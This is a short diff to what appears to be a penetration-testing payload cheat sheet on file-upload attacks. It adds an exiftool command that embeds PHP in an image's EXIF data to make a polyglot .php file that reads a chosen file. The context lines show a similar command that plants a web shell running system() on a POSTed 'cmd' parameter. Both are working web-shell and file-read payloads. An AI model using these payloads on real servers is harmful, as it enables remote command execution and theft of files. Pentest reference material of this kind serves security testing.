@@ -132,6 +132,12 @@ exiftool -Copyright="PayloadsAllTheThings" -Artist="Pentest" -ImageUniqueID="Exa
 exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg
 ```
 
+Create a custom php with exif tag of an image. View contents of specified file.
+
+```ps1
+exiftool -Comment="<?php echo 'START ' . file_get_contents('<FIILENAME>') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+```
+
 ### Configuration Files
 
 If you are trying to upload files to a :
